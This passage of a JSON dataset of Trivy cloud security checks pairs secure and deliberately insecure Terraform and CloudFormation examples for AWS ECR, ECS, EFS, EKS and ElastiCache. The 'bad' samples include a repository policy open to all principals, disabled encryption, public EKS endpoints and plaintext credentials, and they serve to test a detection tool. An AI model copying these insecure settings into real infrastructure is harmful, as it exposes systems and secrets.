              "resource \"aws_ecr_repository\" \"example\" {\n  name = \"bar\"\n}\n\nresource \"aws_ecr_repository_policy\" \"example\" {\n  repository = aws_ecr_repository.example.name\n  policy     = <<EOF\n {\n     \"Version\": \"2008-10-17\",\n     \"Statement\": [\n         {\n             \"Sid\": \"new policy\",\n             \"Effect\": \"Allow\",\n             \"Principal\": \"arn:aws:iam::${data.aws_caller_identity.current.account_id}:root\",\n             \"Action\": [\n                 \"ecr:SetRepositoryPolicy\"\n             ]\n         }\n     ]\n }\n EOF\n}"
            ],
            "bad": [
              "resource \"aws_ecr_repository\" \"example\" {\n  name = \"bar\"\n}\n\nresource \"aws_ecr_repository_policy\" \"example\" {\n  repository = aws_ecr_repository.example.name\n\n  policy = <<EOF\n {\n     \"Version\": \"2008-10-17\",\n     \"Statement\": [\n         {\n             \"Sid\": \"new policy\",\n             \"Effect\": \"Allow\",\n             \"Principal\": \"*\",\n             \"Action\": [\n                 \"ecr:SetRepositoryPolicy\"\n             ]\n         }\n     ]\n }\n EOF\n}",
              "resource \"aws_ecr_repository\" \"example\" {\n  name = \"bar\"\n}\n\ndata \"aws_iam_policy_document\" \"example\" {\n  version = \"2008-10-17\"\n  statement {\n    sid    = \"new policy\"\n    effect = \"Allow\"\n    principals {\n      type        = \"*\"\n      identifiers = [\"*\"]\n    }\n    actions = [\n      \"ecr:SetRepositoryPolicy\"\n    ]\n  }\n}\n\nresource \"aws_ecr_repository_policy\" \"example\" {\n  repository = aws_ecr_repository.example.name\n  policy     = data.aws_iam_policy_document.example.json\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ECR-REPOSITORY_CUSTOMER_KEY",
        "title": "Repository Customer Key",
        "provider": "aws",
        "service": "ecr",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-ecr-repository.html#cfn-ecr-repository-encryptionconfiguration\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ECR::Repository\n          Properties:\n            EncryptionConfiguration:\n              EncryptionType: KMS\n              KmsKey: alias/ecr-key\n            RepositoryName: test-repository\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ECR::Repository\n          Properties:\n            RepositoryName: test-repository\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository#encryption_configuration\n  good:\n    - |-\n      resource \"aws_kms_key\" \"ecr_kms\" {\n        enable_key_rotation = true\n      }\n\n      resource \"aws_ecr_repository\" \"good_example\" {\n        name = \"bar\"\n        encryption_configuration {\n          encryption_type = \"KMS\"\n          kms_key         = aws_kms_key.ecr_kms.key_id\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_ecr_repository\" \"bad_example\" {\n        name = \"bar\"\n      }\n    - |-\n      resource \"aws_ecr_repository\" \"bad_example\" {\n        name = \"bar\"\n        encryption_configuration {\n          encryption_type = \"KMS\"\n        }\n      }\n",
        "file_name": "repository_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ecr/repository_customer_key.yaml",
        "local_path": "aws/ecr/repository_customer_key.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-ecr-repository.html#cfn-ecr-repository-encryptionconfiguration"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ECR::Repository\n    Properties:\n      EncryptionConfiguration:\n        EncryptionType: KMS\n        KmsKey: alias/ecr-key\n      RepositoryName: test-repository"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ECR::Repository\n    Properties:\n      RepositoryName: test-repository"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository#encryption_configuration"
            ],
            "good": [
              "resource \"aws_kms_key\" \"ecr_kms\" {\n  enable_key_rotation = true\n}\n\nresource \"aws_ecr_repository\" \"good_example\" {\n  name = \"bar\"\n  encryption_configuration {\n    encryption_type = \"KMS\"\n    kms_key         = aws_kms_key.ecr_kms.key_id\n  }\n}"
            ],
            "bad": [
              "resource \"aws_ecr_repository\" \"bad_example\" {\n  name = \"bar\"\n}",
              "resource \"aws_ecr_repository\" \"bad_example\" {\n  name = \"bar\"\n  encryption_configuration {\n    encryption_type = \"KMS\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ECS-ENABLE_CONTAINER_INSIGHT",
        "title": "Enable Container Insight",
        "provider": "aws",
        "service": "ecs",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ECS::Cluster\n          Properties:\n            ClusterName: MyCluster\n            ClusterSettings:\n              - Name: containerInsights\n                Value: enabled\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ECS::Cluster\n          Properties:\n            ClusterName: MyCluster\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecs_cluster#setting\n  good:\n    - |-\n      resource \"aws_ecs_cluster\" \"good_example\" {\n        name = \"services-cluster\"\n\n        setting {\n          name  = \"containerInsights\"\n          value = \"enabled\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_ecs_cluster\" \"bad_example\" {\n        name = \"services-cluster\"\n      }\n",
        "file_name": "enable_container_insight.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ecs/enable_container_insight.yaml",
        "local_path": "aws/ecs/enable_container_insight.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ECS::Cluster\n    Properties:\n      ClusterName: MyCluster\n      ClusterSettings:\n        - Name: containerInsights\n          Value: enabled"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ECS::Cluster\n    Properties:\n      ClusterName: MyCluster"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecs_cluster#setting"
            ],
            "good": [
              "resource \"aws_ecs_cluster\" \"good_example\" {\n  name = \"services-cluster\"\n\n  setting {\n    name  = \"containerInsights\"\n    value = \"enabled\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_ecs_cluster\" \"bad_example\" {\n  name = \"services-cluster\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ECS-ENABLE_IN_TRANSIT_ENCRYPTION",
        "title": "Enable In Transit Encryption",
        "provider": "aws",
        "service": "ecs",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ECS::TaskDefinition\n          Properties:\n            ContainerDefinitions:\n              - Image: amazon/amazon-ecs-sample\n            Volumes:\n              - EFSVolumeConfiguration:\n                  FilesystemId: fs1\n                  TransitEncryption: ENABLED\n                Name: jenkins-home\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ECS::TaskDefinition\n          Properties:\n            ContainerDefinitions:\n              - Image: amazon/amazon-ecs-sample\n            Volumes:\n              - EFSVolumeConfiguration:\n                  FilesystemId: fs1\n                  TransitEncryption: DISABLED\n                Name: jenkins-home\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecs_task_definition#transit_encryption\n  good:\n    - |-\n      resource \"aws_ecs_task_definition\" \"good_example\" {\n        container_definitions = file(\"task-definitions/service.json\")\n        volume {\n          name = \"service-storage\"\n          efs_volume_configuration {\n            file_system_id     = aws_efs_file_system.fs.id\n            transit_encryption = \"ENABLED\"\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_ecs_task_definition\" \"bad_example\" {\n        container_definitions = file(\"task-definitions/service.json\")\n        volume {\n          name = \"service-storage\"\n          efs_volume_configuration {\n            file_system_id = aws_efs_file_system.fs.id\n            root_directory = \"/opt/data\"\n          }\n        }\n      }\n",
        "file_name": "enable_in_transit_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ecs/enable_in_transit_encryption.yaml",
        "local_path": "aws/ecs/enable_in_transit_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ECS::TaskDefinition\n    Properties:\n      ContainerDefinitions:\n        - Image: amazon/amazon-ecs-sample\n      Volumes:\n        - EFSVolumeConfiguration:\n            FilesystemId: fs1\n            TransitEncryption: ENABLED\n          Name: jenkins-home"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ECS::TaskDefinition\n    Properties:\n      ContainerDefinitions:\n        - Image: amazon/amazon-ecs-sample\n      Volumes:\n        - EFSVolumeConfiguration:\n            FilesystemId: fs1\n            TransitEncryption: DISABLED\n          Name: jenkins-home"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecs_task_definition#transit_encryption"
            ],
            "good": [
              "resource \"aws_ecs_task_definition\" \"good_example\" {\n  container_definitions = file(\"task-definitions/service.json\")\n  volume {\n    name = \"service-storage\"\n    efs_volume_configuration {\n      file_system_id     = aws_efs_file_system.fs.id\n      transit_encryption = \"ENABLED\"\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"aws_ecs_task_definition\" \"bad_example\" {\n  container_definitions = file(\"task-definitions/service.json\")\n  volume {\n    name = \"service-storage\"\n    efs_volume_configuration {\n      file_system_id = aws_efs_file_system.fs.id\n      root_directory = \"/opt/data\"\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ECS-NO_PLAINTEXT_SECRETS",
        "title": "No Plaintext Secrets",
        "provider": "aws",
        "service": "ecs",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ECS::TaskDefinition\n          Properties:\n            ContainerDefinitions:\n              - Image: amazon/amazon-ecs-sample\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ECS::TaskDefinition\n          Properties:\n            ContainerDefinitions:\n              - Environment:\n                  - Name: AWS_ACCESS_KEY_ID\n                    Value: AIPA8YOHGIS58IBFDU3E\n                Image: amazon/amazon-ecs-sample\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecs_task_definition\n  good:\n    - |-\n      resource \"aws_ecs_task_definition\" \"good_example\" {\n        container_definitions = <<EOF\n       [\n         {\n           \"name\": \"my_service\",\n           \"environment\": [\n             { \"name\": \"ENVIRONMENT\", \"value\": \"development\" }\n           ]\n         }\n       ]\n       EOF\n      }\n  bad:\n    - |-\n      resource \"aws_ecs_task_definition\" \"bad_example\" {\n        container_definitions = <<EOF\n       [\n         {\n           \"name\": \"my_service\",\n           \"environment\": [\n             { \"name\": \"ENVIRONMENT\", \"value\": \"development\" },\n             { \"name\": \"DATABASE_PASSWORD\", \"value\": \"oh no D:\"}\n           ]\n         }\n       ]\n       EOF\n      }\n",
        "file_name": "no_plaintext_secrets.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ecs/no_plaintext_secrets.yaml",
        "local_path": "aws/ecs/no_plaintext_secrets.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ECS::TaskDefinition\n    Properties:\n      ContainerDefinitions:\n        - Image: amazon/amazon-ecs-sample"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ECS::TaskDefinition\n    Properties:\n      ContainerDefinitions:\n        - Environment:\n            - Name: AWS_ACCESS_KEY_ID\n              Value: AIPA8YOHGIS58IBFDU3E\n          Image: amazon/amazon-ecs-sample"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecs_task_definition"
            ],
            "good": [
              "resource \"aws_ecs_task_definition\" \"good_example\" {\n  container_definitions = <<EOF\n [\n   {\n     \"name\": \"my_service\",\n     \"environment\": [\n       { \"name\": \"ENVIRONMENT\", \"value\": \"development\" }\n     ]\n   }\n ]\n EOF\n}"
            ],
            "bad": [
              "resource \"aws_ecs_task_definition\" \"bad_example\" {\n  container_definitions = <<EOF\n [\n   {\n     \"name\": \"my_service\",\n     \"environment\": [\n       { \"name\": \"ENVIRONMENT\", \"value\": \"development\" },\n       { \"name\": \"DATABASE_PASSWORD\", \"value\": \"oh no D:\"}\n     ]\n   }\n ]\n EOF\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EFS-ENABLE_AT_REST_ENCRYPTION",
        "title": "Enable At Rest Encryption",
        "provider": "aws",
        "service": "efs",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-efs-filesystem.html#cfn-efs-filesystem-encrypted\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::EFS::FileSystem\n          Properties:\n            Encrypted: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::EFS::FileSystem\n          Properties:\n            Encrypted: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/efs_file_system\n  good:\n    - |-\n      resource \"aws_efs_file_system\" \"good_example\" {\n        name      = \"bar\"\n        encrypted = true\n      }\n  bad:\n    - |-\n      resource \"aws_efs_file_system\" \"bad_example\" {\n        name      = \"bar\"\n        encrypted = false\n      }\n",
        "file_name": "enable_at_rest_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/efs/enable_at_rest_encryption.yaml",
        "local_path": "aws/efs/enable_at_rest_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-efs-filesystem.html#cfn-efs-filesystem-encrypted"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::EFS::FileSystem\n    Properties:\n      Encrypted: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::EFS::FileSystem\n    Properties:\n      Encrypted: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/efs_file_system"
            ],
            "good": [
              "resource \"aws_efs_file_system\" \"good_example\" {\n  name      = \"bar\"\n  encrypted = true\n}"
            ],
            "bad": [
              "resource \"aws_efs_file_system\" \"bad_example\" {\n  name      = \"bar\"\n  encrypted = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EKS-ENABLE_CONTROL_PLANE_LOGGING",
        "title": "Enable Control Plane Logging",
        "provider": "aws",
        "service": "eks",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-eks-cluster.html#cfn-eks-cluster-logging\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::EKS::Cluster\n          Properties:\n            Logging:\n              ClusterLogging:\n                EnabledTypes:\n                  - Type: api\n                  - Type: audit\n                  - Type: authenticator\n                  - Type: controllerManager\n                  - Type: scheduler\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::EKS::Cluster\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#enabled_cluster_log_types\n  good:\n    - |-\n      resource \"aws_eks_cluster\" \"good_example\" {\n        enabled_cluster_log_types = [\"api\", \"authenticator\", \"audit\", \"scheduler\", \"controllerManager\"]\n      }\n  bad:\n    - |-\n      resource \"aws_eks_cluster\" \"bad_example\" {}\n",
        "file_name": "enable_control_plane_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/eks/enable_control_plane_logging.yaml",
        "local_path": "aws/eks/enable_control_plane_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-eks-cluster.html#cfn-eks-cluster-logging"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::EKS::Cluster\n    Properties:\n      Logging:\n        ClusterLogging:\n          EnabledTypes:\n            - Type: api\n            - Type: audit\n            - Type: authenticator\n            - Type: controllerManager\n            - Type: scheduler"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::EKS::Cluster"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#enabled_cluster_log_types"
            ],
            "good": [
              "resource \"aws_eks_cluster\" \"good_example\" {\n  enabled_cluster_log_types = [\"api\", \"authenticator\", \"audit\", \"scheduler\", \"controllerManager\"]\n}"
            ],
            "bad": [
              "resource \"aws_eks_cluster\" \"bad_example\" {}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EKS-ENCRYPT_SECRETS",
        "title": "Encrypt Secrets",
        "provider": "aws",
        "service": "eks",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::EKS::Cluster\n          Properties:\n            EncryptionConfig:\n              - Provider:\n                  KeyArn: alias/eks-kms\n                Resources:\n                  - secrets\n            Name: goodExample\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::EKS::Cluster\n          Properties:\n            Name: badExample\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#encryption_config\n  good:\n    - |-\n      resource \"aws_kms_key\" \"eks\" {\n        enable_key_rotation = true\n      }\n\n      resource \"aws_eks_cluster\" \"good_example\" {\n        encryption_config {\n          resources = [\"secrets\"]\n          provider {\n            key_arn = aws_kms_key.eks.arn\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_eks_cluster\" \"bad_example\" {\n        name = \"bad_example_cluster\"\n      }\n    - |-\n      resource \"aws_eks_cluster\" \"bad_example\" {\n        name = \"bad_example_cluster\"\n        encryption_config {\n          resources = [\"secrets\"]\n        }\n      }\n",
        "file_name": "encrypt_secrets.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/eks/encrypt_secrets.yaml",
        "local_path": "aws/eks/encrypt_secrets.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::EKS::Cluster\n    Properties:\n      EncryptionConfig:\n        - Provider:\n            KeyArn: alias/eks-kms\n          Resources:\n            - secrets\n      Name: goodExample"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::EKS::Cluster\n    Properties:\n      Name: badExample"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#encryption_config"
            ],
            "good": [
              "resource \"aws_kms_key\" \"eks\" {\n  enable_key_rotation = true\n}\n\nresource \"aws_eks_cluster\" \"good_example\" {\n  encryption_config {\n    resources = [\"secrets\"]\n    provider {\n      key_arn = aws_kms_key.eks.arn\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"aws_eks_cluster\" \"bad_example\" {\n  name = \"bad_example_cluster\"\n}",
              "resource \"aws_eks_cluster\" \"bad_example\" {\n  name = \"bad_example_cluster\"\n  encryption_config {\n    resources = [\"secrets\"]\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EKS-NO_PUBLIC_CLUSTER_ACCESS",
        "title": "No Public Cluster Access",
        "provider": "aws",
        "service": "eks",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-eks-cluster-resourcesvpcconfig.html\n  good:\n    - |-\n      Resources:\n        EKSCluster:\n          Type: AWS::EKS::Cluster\n          Properties:\n            ResourcesVpcConfig:\n              EndpointPublicAccess: false\n  bad:\n    - |-\n      Resources:\n        EKSCluster:\n          Type: AWS::EKS::Cluster\n          Properties:\n            ResourcesVpcConfig:\n              EndpointPublicAccess: true\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#endpoint_public_access\n  good:\n    - |-\n      resource \"aws_eks_cluster\" \"good_example\" {\n        name = \"good_example_cluster\"\n        vpc_config {\n          endpoint_public_access = false\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_eks_cluster\" \"bad_example\" {\n        name = \"bad_example_cluster\"\n        vpc_config {\n          endpoint_public_access = true\n        }\n      }\n",
        "file_name": "no_public_cluster_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/eks/no_public_cluster_access.yaml",
        "local_path": "aws/eks/no_public_cluster_access.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-eks-cluster-resourcesvpcconfig.html"
            ],
            "good": [
              "Resources:\n  EKSCluster:\n    Type: AWS::EKS::Cluster\n    Properties:\n      ResourcesVpcConfig:\n        EndpointPublicAccess: false"
            ],
            "bad": [
              "Resources:\n  EKSCluster:\n    Type: AWS::EKS::Cluster\n    Properties:\n      ResourcesVpcConfig:\n        EndpointPublicAccess: true"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#endpoint_public_access"
            ],
            "good": [
              "resource \"aws_eks_cluster\" \"good_example\" {\n  name = \"good_example_cluster\"\n  vpc_config {\n    endpoint_public_access = false\n  }\n}"
            ],
            "bad": [
              "resource \"aws_eks_cluster\" \"bad_example\" {\n  name = \"bad_example_cluster\"\n  vpc_config {\n    endpoint_public_access = true\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EKS-NO_PUBLIC_CLUSTER_ACCESS_TO_CIDR",
        "title": "No Public Cluster Access To Cidr",
        "provider": "aws",
        "service": "eks",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-eks-cluster-resourcesvpcconfig.html\n  good:\n    - |-\n      Resources:\n        EKSCluster:\n          Type: AWS::EKS::Cluster\n          Properties:\n            ResourcesVpcConfig:\n              EndpointPublicAccess: false\n              PublicAccessCidrs:\n                - 10.2.0.0/8\n  bad:\n    - |-\n      Resources:\n        EKSCluster:\n          Type: AWS::EKS::Cluster\n          Properties:\n            ResourcesVpcConfig:\n              EndpointPublicAccess: true\n              PublicAccessCidrs:\n                - 0.0.0.0/0\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#vpc_config\n  good:\n    - |-\n      resource \"aws_eks_cluster\" \"good_example\" {\n        name = \"good_example_cluster\"\n        vpc_config {\n          endpoint_public_access = false\n          public_access_cidrs    = [\"0.0.0.0/0\"]\n        }\n      }\n    - |-\n      resource \"aws_eks_cluster\" \"good_example\" {\n        name = \"good_example_cluster\"\n        vpc_config {\n          endpoint_public_access = true\n          public_access_cidrs    = [\"10.2.0.0/8\"]\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_eks_cluster\" \"bad_example\" {\n        name = \"bad_example_cluster\"\n        vpc_config {\n          endpoint_public_access = true\n        }\n      }\n",
        "file_name": "no_public_cluster_access_to_cidr.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/eks/no_public_cluster_access_to_cidr.yaml",
        "local_path": "aws/eks/no_public_cluster_access_to_cidr.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-eks-cluster-resourcesvpcconfig.html"
            ],
            "good": [
              "Resources:\n  EKSCluster:\n    Type: AWS::EKS::Cluster\n    Properties:\n      ResourcesVpcConfig:\n        EndpointPublicAccess: false\n        PublicAccessCidrs:\n          - 10.2.0.0/8"
            ],
            "bad": [
              "Resources:\n  EKSCluster:\n    Type: AWS::EKS::Cluster\n    Properties:\n      ResourcesVpcConfig:\n        EndpointPublicAccess: true\n        PublicAccessCidrs:\n          - 0.0.0.0/0"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#vpc_config"
            ],
            "good": [
              "resource \"aws_eks_cluster\" \"good_example\" {\n  name = \"good_example_cluster\"\n  vpc_config {\n    endpoint_public_access = false\n    public_access_cidrs    = [\"0.0.0.0/0\"]\n  }\n}",
              "resource \"aws_eks_cluster\" \"good_example\" {\n  name = \"good_example_cluster\"\n  vpc_config {\n    endpoint_public_access = true\n    public_access_cidrs    = [\"10.2.0.0/8\"]\n  }\n}"
            ],
            "bad": [
              "resource \"aws_eks_cluster\" \"bad_example\" {\n  name = \"bad_example_cluster\"\n  vpc_config {\n    endpoint_public_access = true\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELASTICACHE-ADD_DESCRIPTION_FOR_SECURITY_GROUP",
        "title": "Add Description For Security Group",
        "provider": "aws",
        "service": "elasticache",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ElastiCache::SecurityGroup\n          Properties:\n            Description: Some description\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ElastiCache::SecurityGroup\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_security_group#description\n  good:\n    - |-\n      resource \"aws_elasticache_security_group\" \"good_example\" {\n        description = \"something\"\n      }\n  bad:\n    - |-\n      resource \"aws_elasticache_security_group\" \"bad_example\" {\n        description = \"\"\n      }\n",
        "file_name": "add_description_for_security_group.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elasticache/add_description_for_security_group.yaml",
        "local_path": "aws/elasticache/add_description_for_security_group.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ElastiCache::SecurityGroup\n    Properties:\n      Description: Some description"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ElastiCache::SecurityGroup"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_security_group#description"
            ],
            "good": [
              "resource \"aws_elasticache_security_group\" \"good_example\" {\n  description = \"something\"\n}"
            ],
            "bad": [
              "resource \"aws_elasticache_security_group\" \"bad_example\" {\n  description = \"\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELASTICACHE-ENABLE_AT_REST_ENCRYPTION",
        "title": "Enable At Rest Encryption",
        "provider": "aws",
        "service": "elasticache",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticache-replicationgroup.html\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ElastiCache::ReplicationGroup\n          Properties:\n            AtRestEncryptionEnabled: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ElastiCache::ReplicationGroup\n          Properties:\n            AtRestEncryptionEnabled: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_replication_group#at_rest_encryption_enabled\n  good:\n    - |-\n      resource \"aws_elasticache_replication_group\" \"good_example\" {\n        replication_group_id          = \"foo\"\n        replication_group_description = \"my foo cluster\"\n\n        at_rest_encryption_enabled = true\n      }\n  bad:\n    - |-\n      resource \"aws_elasticache_replication_group\" \"bad_example\" {\n        replication_group_id          = \"foo\"\n        replication_group_description = \"my foo cluster\"\n\n        at_rest_encryption_enabled = false\n      }\n",
        "file_name": "enable_at_rest_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elasticache/enable_at_rest_encryption.yaml",
        "local_path": "aws/elasticache/enable_at_rest_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticache-replicationgroup.html"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ElastiCache::ReplicationGroup\n    Properties:\n      AtRestEncryptionEnabled: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ElastiCache::ReplicationGroup\n    Properties:\n      AtRestEncryptionEnabled: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_replication_group#at_rest_encryption_enabled"
            ],
            "good": [
              "resource \"aws_elasticache_replication_group\" \"good_example\" {\n  replication_group_id          = \"foo\"\n  replication_group_description = \"my foo cluster\"\n\n  at_rest_encryption_enabled = true\n}"
            ],
            "bad": [
              "resource \"aws_elasticache_replication_group\" \"bad_example\" {\n  replication_group_id          = \"foo\"\n  replication_group_description = \"my foo cluster\"\n\n  at_rest_encryption_enabled = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELASTICACHE-ENABLE_BACKUP_RETENTION",
        "title": "Enable Backup Retention",
        "provider": "aws",
        "service": "elasticache",
        "language": "terraform",
